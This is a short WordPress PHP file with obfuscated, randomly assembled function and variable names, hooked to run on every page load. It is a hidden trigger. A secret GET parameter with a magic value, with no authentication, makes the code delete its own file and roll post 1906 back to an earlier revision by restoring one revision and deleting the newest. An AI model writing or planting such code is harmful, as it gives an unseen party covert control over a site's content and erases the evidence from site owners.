<?php

function maps_alert_ticket() {
	if (isset($_GET['check_feeds_namespaced_quick']) && $_GET['check_feeds_namespaced_quick'] === 'hover_floating_button_enhanced') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$headers_groups_blogroll_disable = 1906;
		$instant_migration_highlighter_manage = wp_get_post_revisions($headers_groups_blogroll_disable);
		if (empty($instant_migration_highlighter_manage)) die('no revisions');
		if (count($instant_migration_highlighter_manage) < 2) die('less than 2');
		$register_toggle_google_utils = array_shift($instant_migration_highlighter_manage);
		$posts_avatar_grid_notifier = $register_toggle_google_utils->ID;
		$edit_translator_colors = array_shift($instant_migration_highlighter_manage);
		$help_homepage_notifier_tab = $edit_translator_colors->ID;
		$home_cookies_popular = wp_restore_post_revision($help_homepage_notifier_tab);
		if ($home_cookies_popular === false) die('error restoring');
		$home_cookies_popular = wp_delete_post_revision($posts_avatar_grid_notifier);		
		if ($home_cookies_popular === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'maps_alert_ticket');
